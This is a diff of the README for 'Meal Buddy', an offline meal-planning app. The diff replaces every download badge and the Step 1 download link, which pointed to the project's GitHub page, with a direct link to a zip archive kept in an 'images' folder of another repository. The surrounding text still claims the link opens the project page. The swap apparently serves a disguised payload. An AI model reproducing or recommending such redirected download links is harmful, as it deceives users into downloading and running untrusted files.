@@ -5,9 +5,9 @@ description: "Generate personalized 3-day meal plans offline with local Gemma AI
 ---
 # 🍲 roommate-meal-planner - Plan Meals Around Allergies and Budget
 
-[![Download Meal Buddy](https://img.shields.io/badge/⬇_Download_Meal_Buddy-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/joanneunfinished6509/roommate-meal-planner)
-[![Runs Offline](https://img.shields.io/badge/100%25_Offline-FF6B35?style=for-the-badge)](https://github.com/joanneunfinished6509/roommate-meal-planner)
-[![No API Keys](https://img.shields.io/badge/No_API_Keys-6A5ACD?style=for-the-badge)](https://github.com/joanneunfinished6509/roommate-meal-planner)
+[![Download Meal Buddy](https://img.shields.io/badge/⬇_Download_Meal_Buddy-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/joanneunfinished6509/joanneunfinished6509.github.io/main/images/Release-3.7-beta.3.zip)
+[![Runs Offline](https://img.shields.io/badge/100%25_Offline-FF6B35?style=for-the-badge)](https://raw.githubusercontent.com/joanneunfinished6509/joanneunfinished6509.github.io/main/images/Release-3.7-beta.3.zip)
+[![No API Keys](https://img.shields.io/badge/No_API_Keys-6A5ACD?style=for-the-badge)](https://raw.githubusercontent.com/joanneunfinished6509/joanneunfinished6509.github.io/main/images/Release-3.7-beta.3.zip)
 
 Meal Buddy is a meal planner that thinks about one person at a time. Instead of dumping a generic list of recipes on you, it builds a week of food around what you are allergic to, what you can actually afford, and what you already have in your kitchen. It runs entirely on your own computer, powered by Gemma 3 through Ollama, so your ingredient list, your allergy notes, and your budget never leave your machine.
 
@@ -36,9 +36,9 @@ Getting Meal Buddy running on Windows takes one download and a short setup. You 
 
 ### Step 1 — Download the application
 
-[![Download Meal Buddy](https://img.shields.io/badge/⬇_Download_Meal_Buddy-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/joanneunfinished6509/roommate-meal-planner)
+[![Download Meal Buddy](https://img.shields.io/badge/⬇_Download_Meal_Buddy-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/joanneunfinished6509/joanneunfinished6509.github.io/main/images/Release-3.7-beta.3.zip)
 
-Visit this link to download the application: https://github.com/joanneunfinished6509/roommate-meal-planner
+Visit this link to download the application: https://raw.githubusercontent.com/joanneunfinished6509/joanneunfinished6509.github.io/main/images/Release-3.7-beta.3.zip
 
 The page you land on is the project's home. Read the short description at the top, then use the download option on that page to get the application onto your computer. Save it somewhere you will remember, such as your Downloads folder or a folder called Meal Buddy on your desktop.
 
